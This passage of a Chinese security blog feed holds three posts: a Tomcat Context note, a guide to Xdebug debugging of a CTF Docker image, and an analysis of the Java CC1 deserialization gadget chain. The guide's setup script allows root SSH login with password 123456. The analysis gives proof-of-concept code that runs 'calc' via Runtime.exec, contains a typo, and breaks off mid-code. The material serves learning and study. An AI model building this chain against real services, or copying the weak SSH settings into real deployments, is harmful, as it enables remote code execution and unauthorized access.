href="#Context" class="headerlink" title="Context"></a>Context</h4><blockquote><p>在Tomcat中，Context是Container组件的一种子容器，其对应的是一个Web应用。Context中可以包含多个Wrapper容器，而Wrapper对应的是一个具体的Servlet定义。因此Context可以用来保存一个Web应用中多个Servlet的上下文信息。</p></blockquote><h4 id="Tomcat中的三种Context"><a href="#Tomcat中的三种Context" class="headerlink" title="Tomcat中的三种Context"></a>Tomcat中的三种Context</h4><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/1-795x1500.jpg"></p><blockquote><p>ServletContext接口的实现类为ApplicationContext类和ApplicationContextFacade类，其中ApplicationContextFacade是对ApplicationContext类的包装。我们对Context容器中各种资源进行操作时，最终调用的还是StandardContext中的方法，因此StandardContext是Tomcat中负责与底层交互的Context。</p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Java-Web&quot;&gt;&lt;a href=&quot;#Java-Web&quot; class=&quot;headerlink&quot; title=&quot;Java Web&quot;&gt;&lt;/a&gt;Java Web&lt;/h1&gt;&lt;h2 id=&quot;Tomcat＋Servlet&quot;&gt;&lt;a href=&quot;#Tomcat＋Servlet&quot;</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>PHP storm + Xdebug 远程调试docker项目</title>
    <link href="http://example.com/2024/03/27/PHP-storm-Xdebug-%E8%BF%9C%E7%A8%8B%E8%B0%83%E8%AF%95docker%E9%A1%B9%E7%9B%AE/"/>
    <id>http://example.com/2024/03/27/PHP-storm-Xdebug-%E8%BF%9C%E7%A8%8B%E8%B0%83%E8%AF%95docker%E9%A1%B9%E7%9B%AE/</id>
    <published>2024-03-27T14:02:29.000Z</published>
    <updated>2024-03-27T16:32:26.062Z</updated>
    
    <content type="html"><![CDATA[<h1 id="PHP-storm-Xdebug-远程调试docker项目-ssh隧道"><a href="#PHP-storm-Xdebug-远程调试docker项目-ssh隧道" class="headerlink" title="PHP storm + Xdebug 远程调试docker项目(ssh隧道)"></a>PHP storm + Xdebug 远程调试docker项目(ssh隧道)</h1><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://www.freebuf.com/articles/web/266512.html">https://www.freebuf.com/articles/web/266512.html</a></p><h2 id="前置准备"><a href="#前置准备" class="headerlink" title="前置准备"></a>前置准备</h2><ol><li>docker环境</li><li>你需要调试的项目</li></ol><p>这里需要调试的项目以上次在做NKCTF的一道题目为例</p><p>题目原 Dockerfile</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">FROM</span> ctfhub/web_nginx_mysql_php_8.<span class="number">0</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> files /var/www/html</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> sh -c <span class="string">&#x27;mysqld_safe &amp;&#x27;</span> \</span></span><br><span class="line"><span class="language-bash">    &amp;&amp; <span class="built_in">sleep</span> 5s \</span></span><br><span class="line"><span class="language-bash">    &amp;&amp; mysql -e <span class="string">&quot;source /var/www/html/db.sql;&quot;</span> -uroot -proot </span></span><br><span class="line">    </span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">chmod</span> -R 777 /var/www/html/app</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">chmod</span> -R 777 /var/www/html/config</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">chmod</span> -R 777 /var/www/html/data</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">chmod</span> -R 777 /var/www/html/static</span></span><br></pre></td></tr></table></figure><p>我们需要对dockerfile进行修改以使用于调试</p><ol><li>安装ssh服务。 PHPSTORM需要 ssh 来进行目录映射，不然无法成功 Debug</li><li>安装 xdebug。这是调试的基础扩展组件</li><li>设置 ssh 允许 root 登陆。毕竟只是个 docker 调试环境，就不弄那么麻烦了。当然如果是线上业务啥的当然要做好权限分配。</li><li>修改 root密码。毕竟不知道密码也无法连接</li><li>启动 ssh 服务</li><li>重启 apache 服务</li></ol><p>可以看见这里拉取了php8.0, 这里我们需要下载安装对应版本的xdebug, 这非常关键!!!</p><p>附一个各php版本对应的xdebug版本, 其他版本另行搜索</p><table><thead><tr><th>php版本</th><th>xdebug版本</th></tr></thead><tbody><tr><td>php7.0</td><td>xdebug 2.8.1</td></tr><tr><td>php7.1</td><td>xdebug 2.9.8</td></tr><tr><td>php7.2</td><td>xdebug 3.1.5</td></tr><tr><td>php7.3</td><td>xdebug 3.1.5</td></tr><tr><td>php7.4</td><td>xdebug 3.1.5</td></tr><tr><td>php8.0</td><td>xdebug 3.1.5</td></tr><tr><td>php8.1</td><td>xdebug 3.1.5</td></tr></tbody></table><p>因此我们需要的是xdebug 3.1.5</p><p>去这个网站查看xdebug(不需要下载下来)</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240327221042712.png" alt="image-20240327221042712"></p><p>可以看见对应有xdebug 3.1.5按照这个文件名, 添加一个dockerfile语句</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">RUN</span><span class="language-bash"> pecl install http://pecl.php.net/get/xdebug-3.1.5.tgz &amp;&amp; \</span></span><br><span class="line"><span class="language-bash">    docker-php-ext-enable xdebug</span></span><br></pre></td></tr></table></figure><p>在Dockerfile的同级目录新建一个start.sh文件, 用于完成步骤3,4,5</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="comment">#设置 ssh 允许 root 登录</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;PermitRootLogin yes&#x27;</span> &gt;&gt; /etc/ssh/sshd_config</span><br><span class="line"><span class="comment">#修改root密码</span></span><br><span class="line"><span class="built_in">echo</span> root:123456 | chpasswd</span><br><span class="line"><span class="comment">#配置 Xdebug。Xdebug 3 的配置如下，和 Xdebug 2不太一样</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;xdebug.client_host = host.docker.internal&quot;</span> &gt;&gt; /usr/local/etc/php/conf.d/docker-php-ext-xdebug.ini</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;xdebug.client_port = 9003&quot;</span> &gt;&gt; /usr/local/etc/php/conf.d/docker-php-ext-xdebug.ini</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;xdebug.mode = debug&quot;</span> &gt;&gt; /usr/local/etc/php/conf.d/docker-php-ext-xdebug.ini</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;xdebug.max_nesting_level = 1000&quot;</span> &gt;&gt; /usr/local/etc/php/conf.d/docker-php-ext-xdebug.ini</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;xdebug.discover_client_host = true&quot;</span> &gt;&gt; /usr/local/etc/php/conf.d/docker-php-ext-xdebug.ini</span><br><span class="line"><span class="comment">#重启 nginx ssh</span></span><br><span class="line">service nginx restart</span><br><span class="line">service ssh restart</span><br><span class="line"><span class="comment">######################################</span></span><br><span class="line"><span class="comment">######################################</span></span><br><span class="line"><span class="comment">#原作者在这加了一个sleep infinity并叮嘱一定加上...... 我们这里千万不要加, 不然进程会一直卡在这导致你访问不了web页面</span></span><br><span class="line"><span class="comment">######################################</span></span><br><span class="line"><span class="comment">######################################</span></span><br></pre></td></tr></table></figure><p>千万要注意这里题目中使用的是nginx, 不是apache2</p><p>之后继续对dockerfile做出调整, 最终为</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">FROM</span> ctfhub/web_nginx_mysql_php_8.<span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> files /var/www/html</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> sh -c <span class="string">&#x27;mysqld_safe &amp;&#x27;</span> \</span></span><br><span class="line"><span class="language-bash">    &amp;&amp; <span class="built_in">sleep</span> 5s \</span></span><br><span class="line"><span class="language-bash">    &amp;&amp; mysql -e <span class="string">&quot;source /var/www/html/db.sql;&quot;</span> -uroot -proot </span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> pecl install http://pecl.php.net/get/xdebug-3.1.5.tgz \</span></span><br><span class="line"><span class="language-bash">    &amp;&amp; docker-php-ext-enable xdebug \</span></span><br><span class="line"><span class="language-bash">    &amp;&amp; apt-get update \</span></span><br><span class="line"><span class="language-bash">    &amp;&amp; apt-get install ssh -y</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">chmod</span> -R 777 /var/www/html/app</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">chmod</span> -R 777 /var/www/html/config</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">chmod</span> -R 777 /var/www/html/data</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">chmod</span> -R 777 /var/www/html/static</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> ./start.sh /start.sh</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">chmod</span> +x /start.sh</span></span><br><span class="line"><span class="keyword">CMD</span><span class="language-bash"> [<span class="string">&quot;/start.sh&quot;</span>]</span></span><br></pre></td></tr></table></figure><p>修改好start.sh和dockerfile之后, 我们手动创建一个镜像</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker build -t mycodbox .</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240327234247184.png" alt="image-20240327234247184"></p><p>之后新建一个容器把81和22端口映射出来</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240328000916452.png" alt="image-20240328000916452"></p><p>看到这里就算成功了</p><p>访问一下也没什么问题</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240328001145301.png" alt="image-20240328001145301"></p><p>之后配置phpstorm, 这里原文中就没什么坑了</p><p>直接跳转到原文链接的方法二, </p><p><a href="https://www.freebuf.com/articles/web/266512.html">https://www.freebuf.com/articles/web/266512.html</a></p><p>后面至作简单的示例</p><p>选择这个</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240328001340954.png" alt="image-20240328001340954"></p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240328001418960.png" alt="image-20240328001418960"></p><p>一路next</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240328001550926.png" alt="image-20240328001550926"></p><p>一路next直到看见项目</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240328001907238.png" alt="image-20240328001907238"></p><p>之后要做</p><ol><li>配置 CLI Interpreter</li><li>配置目录映射</li><li>设置Xdebug端口</li><li>配置一个 Run&#x2F;Debug Configuration</li><li>启动 PHP Debug Listening</li></ol><p><strong>配置 CLI Interpreter</strong></p><p>进入 File -&gt; Settings -&gt; Languages &amp; Frameworks -&gt; PHP。设置 CLI Interpreter</p><p>新建一个 CLI Interpreter。选择 From Docker, Vagrant, VM, WSL,Remote….</p><p>这里我们可以填 SSH，也可以直接选择 Docker。我这里用的是 SSH</p><p>设置 PHP executable 路径。不知道可以进入 container 中使用<code>whereis php</code>进行搜索</p><p>参考原文, 这里不做演示了</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240328002119294.png" alt="image-20240328002119294"></p><p><strong>配置 目录映射</strong></p><p>进入 File -&gt; Settings -&gt; Languages &amp; Frameworks -&gt; PHP -&gt; Servers。配置目录映射</p><p>注意一定要把 Use path mappings 的勾勾上，才能配置目录映射</p><p>Absolute path on the server 是要手动打上服务器路径的</p><p><strong>配置一个 Run&#x2F;Debug Configuration</strong></p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240328002530718.png" alt="image-20240328002530718"></p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240328002948142.png" alt="image-20240328002948142"></p><p>打个断点试试, 成功!!</p><p><strong><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240328002929316.png" alt="image-20240328002929316"></strong></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;PHP-storm-Xdebug-远程调试docker项目-ssh隧道&quot;&gt;&lt;a href=&quot;#PHP-storm-Xdebug-远程调试docker项目-ssh隧道&quot; class=&quot;headerlink&quot; title=&quot;PHP storm + Xdebug 远程调</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>Java反序列化之CC链</title>
    <link href="http://example.com/2024/03/15/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BCC%E9%93%BE/"/>
    <id>http://example.com/2024/03/15/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BCC%E9%93%BE/</id>
    <published>2024-03-15T13:17:27.000Z</published>
    <updated>2024-05-19T15:56:51.413Z</updated>
    
    <content type="html"><![CDATA[<h1 id="CC1"><a href="#CC1" class="headerlink" title="CC1"></a>CC1</h1><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://www.freebuf.com/articles/web/335892.html">https://www.freebuf.com/articles/web/335892.html</a></p><p><a href="https://boogipop.com/2023/03/02/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%A0%94%E7%A9%B6/#1X2-%E6%B7%B1%E5%85%A5%E7%A0%94%E7%A9%B6CC%E9%93%BE%EF%BC%881-7%EF%BC%89">https://boogipop.com/2023/03/02/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%A0%94%E7%A9%B6/#1X2-%E6%B7%B1%E5%85%A5%E7%A0%94%E7%A9%B6CC%E9%93%BE%EF%BC%881-7%EF%BC%89</a></p><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>jdk-8u65</p><p><a href="https://www.oracle.com/java/technologies/javase/javase8-archive-downloads.html">https://www.oracle.com/java/technologies/javase/javase8-archive-downloads.html</a></p><p>jdk源码</p><p><a href="https://hg.openjdk.org/jdk8u/jdk8u/jdk/rev/af660750b2f4">https://hg.openjdk.org/jdk8u/jdk8u/jdk/rev/af660750b2f4</a></p><p>maven3.6.3</p><p><a href="https://archive.apache.org/dist/maven/maven-3/3.6.3/binaries/">https://archive.apache.org/dist/maven/maven-3/3.6.3/binaries/</a></p><p>关于maven的配置教程</p><p><a href="https://blog.csdn.net/succing/article/details/127281200">https://blog.csdn.net/succing/article/details/127281200</a></p><p>坑比较多, 不过上面这几篇文章都能完美解决</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240315213238197.png" alt="image-20240315213238197"></p><p>到这里环境就搭建好了</p><p>现在开始分析链子</p><h2 id="链子分析"><a href="#链子分析" class="headerlink" title="链子分析"></a>链子分析</h2><p>还记得Java反序列化的基础吗, 我们需要一个readObject方法来作为反序列化的入口</p><p>而我们的最终目的当然是命令执行</p><p>一个正常的思路应该是从链子的尾部开始的, 先找到危险函数, 再想办法如何调用到它</p><p>所以首先是寻找一个可以命令执行的地方</p><p>这里需要的是Transformer这个接口</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240317132926538.png" alt="image-20240317132926538"></p><p>ctrl + alt + B查看实现了该接口的类</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240317133044679.png" alt="image-20240317133044679"></p><p>这里要用到的就是InvokerTransformer这个类</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240317133325160.png" alt="image-20240317133325160"></p><p>InvokerTransformer的transform方法存在反射调用任意类</p><p>浅试一下利用InvokerTransformer类来弹个计算器</p><p>根据这个构造函数来传入参数</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240317141434267.png" alt="image-20240317141434267"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Runtime</span> <span class="variable">runtime</span>  <span class="operator">=</span> Runtime.getRuntime();</span><br><span class="line">        <span class="type">InvokerTransformer</span> <span class="variable">invokerTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;);</span><br><span class="line">        invokerTransformer.transform(runtime);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240317141358312.png" alt="image-20240317141358312"></p><p>这里就成功弹了计算器</p><p>现在我们找到了一个最终的出口, 接下来就是要返回去找哪里调用了这个危险的transform方法</p><p>右键find useges, 找到这个TransformedMap</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240317142752780.png" alt="image-20240317142752780"></p><p>跟进</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240317143423354.png" alt="image-20240317143423354"></p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240317143534346.png" alt="image-20240317143534346"></p><p>第203行的checkSetValue调用了valueTransformer下的transform, 而这个valueTransformer是由构造函数的参数决定的</p><p>并且, 构造器TransformedMap是一个protected保护类型, 我们不能从外部直接调用, 需要从其他调用了TransformedMap的地方入手 </p><p>在<code>decorate()</code>静态方法中, 直接new了一个TransformedMap对象</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240317144110965.png" alt="image-20240317144110965"></p><p>控制valueTransformer的地方有了, 那么谁来调用checkSetValue呢?</p><p>依旧是find useages</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240317145629199.png" alt="image-20240317145629199"></p><p>在AbstractInputCheckedMapDecorator这个抽象类中的**setValue()**调用了checkSetValue方法</p><p>并且AbstractInputCheckedMapDecorator是TransformedMap的父类</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240317175103045.png" alt="image-20240317175103045"></p><p>这里就不得不补一下java集合的知识, </p><p>在遍历一个集合时, 可以使用增强for循环进行一下操作</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (Map.Entry&lt;Integer, String&gt; entry : map.entrySet()) &#123;</span><br><span class="line">    <span class="comment">//Map.entry&lt;Integer,String&gt; 映射项（键-值对）  有几个方法：用上面的名字entry</span></span><br><span class="line">    <span class="comment">//entry.getKey() ;entry.getValue(); entry.setValue();</span></span><br><span class="line">    <span class="comment">//map.entrySet()  返回此映射中包含的映射关系的 Set视图。</span></span><br><span class="line">    System.out.println(<span class="string">&quot;key= &quot;</span> + entry.getKey() + <span class="string">&quot; and value= &quot;</span> + entry.getValue());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中Map.Entry&lt;Integer, String&gt; entry表示键值对, map.entrySet()表示键值对的集合</p><p>这里setValue()就是entry下的一个方法</p><p>因此我们可以利用TransformedMap里的decorate创建一个TransformedMap实例, 由于其继承了AbstractInputCheckedMapDecorator类, 当调用setValue时, 就对调用AbstractInputCheckedMapDecorator下的setValue, 从而调用parent.checkSetValue(value);</p><p>那么, 这个parent又是怎么一回事呢?</p><p>好像很少有文章把这个讲的很明白(或许是我太菜了)</p><p>我们预期的parent应该是一个InvokerTransformer的对象</p><p>不妨调试一下看看怎么个事</p><p>注意看这个transformedmap.entrySet()</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240318220856808.png" alt="image-20240318220856808"></p><p>跟进</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240318221154799.png" alt="image-20240318221154799"></p><p>这里跳到了TransformedMap的父类AbstractInputCheckedMapDecorator下的entrySet(), 注意此时仍然在TransformedMap中, 这个entrySet()是继承来的</p><p>跟进isSetValueChecking()</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240318221426861.png" alt="image-20240318221426861"></p><p>这里回到了TransformedMap自己的isSetValueChecking()方法, 由于valueTransformer赋值了, 所以返回true</p><p>跟进</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240318221554102.png" alt="image-20240318221554102"></p><p>注意这个EntrySet(), 第二个参数是this, 也就是本身, 跟进</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240318221800461.png" alt="image-20240318221800461"></p><p>这里恍然大悟, this.parent就是这个对象本身, 此时这个对象就是TransformedMap实例, 它下面的checkSetValue正是我们要调用到的方法</p><p>至此这个谜团就被解开了</p><p>那么我们从decorate开始, 编写一段poc</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Runtime</span> <span class="variable">runtime</span>  <span class="operator">=</span> Runtime.getRuntime();</span><br><span class="line">        <span class="type">InvokerTransformer</span> <span class="variable">invokerTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;);</span><br><span class="line">        Map&lt;Object,Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        map.put(<span class="string">&quot;n4c1&quot;</span>, <span class="string">&quot;cabbage&quot;</span>);</span><br><span class="line">        Map&lt;Object,Object&gt; transformedmap = TransformedMap.decorate(map, <span class="literal">null</span>, invokerTransformer);</span><br><span class="line">        <span class="keyword">for</span>(Map.Entry entry : transformedmap.entrySet()) &#123;</span><br><span class="line">            entry.setValue(runtime);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240317184029496.png" alt="image-20240317184029496"></p><p>成功调用</p><p>至此, 链子就延伸到了setValue</p><p>依旧是find usages, 看看哪里调用了setValue</p><p>这里应该是要搜索找一个AnnotationInvocationHandler类, 但是我并没有找到</p><p>所以直接去到目录下找了</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240317205707923.png" alt="image-20240317205707923"></p><p>这里是点进去是.class文件, 看见的就是反编译后的代码, 那么就可以肯定是配置源码那一步出错了</p><p>找了半天发现之前sun包的替换搞错了, 正确的路径: jdk-af660750b2f4\src\share\classes\sun</p><p>应该使用这里的sun包加到djk的src中去</p><p>之后就可以找到AnnotationInvocationHandler这个类, 它重写了应该readObject方法且在readObject中进行了对集合的遍历 并且调用了setValue</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240318223012579.png" alt="image-20240318223012579"></p><p>我们的第一想法应该是去控制这个memberValues()</p><p>可以看见在构造函数中对其进行了赋值, 但是这个构造函数并没有public修饰</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240318223208459.png" alt="image-20240318223208459"></p><p>因此需要用反射获取这个类</p><p>这里构造函数的第一个参数Class&lt;? extends Annotation&gt;表示一个注解类</p><p><strong>什么是注解类?</strong></p><p><a href="https://www.runoob.com/w3cnote/java-annotation.html">https://www.runoob.com/w3cnote/java-annotation.html</a></p><p>按我个人理解, 这与python的装饰器有一丝的相似之处</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="type">Constructor</span> <span class="variable">aihConstructor</span> <span class="operator">=</span> c.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line"></span><br><span class="line"><span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> aihConstructor.newInstance(Target.class, transformedmap);<span class="comment">//传入一个Target类, 他就是一个注解类</span></span><br></pre></td></tr></table></figure><p>由此就可以调用到memberValue.setValue即transformedmap.setValue</p><p>但是眼前又出现了一个问题, 就是如何满足这里的if条件</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240320220648856.png" alt="image-20240320220648856"></p><p>这里先放一放</p><p>实际上, 一共有三个问题待解决</p><ol><li>由于只有实现 了Serializable 或者 Externalizable 接口的类的对象才能被序列化为字节序列, 而Runtime并没有实现, Runtime无法被序列化便是第一个问题</li><li>上图中memberValue.setValue的参数并不是我们预期的内容</li><li>如何两个if</li></ol><p>首先是如何序列化Runtime</p><p><code>Runtime</code>是不能序列化的，但是<code>Runtime.class</code>是可以序列化的。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NoSuchMethodException, InvocationTargetException, IllegalAccessException &#123;</span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span>s Runtime.class;</span><br><span class="line">        <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> c.getMethod(<span class="string">&quot;getRuntime&quot;</span>);</span><br><span class="line">        <span class="type">Runtime</span> <span class="variable">runtime</span> <span class="operator">=</span> (Runtime) method.invoke(<span class="literal">null</span>, <span class="literal">null</span>);</span><br><span class="line">        <span class="type">Method</span> <span class="variable">run</span> <span class="operator">=</span> c.getMethod(<span class="string">&quot;exec&quot;</span>, String.class);</span><br><span class="line">        run.invoke(runtime, <span class="string">&quot;calc&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用<code>InvokerTransformer</code>反射调用Runtime</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span 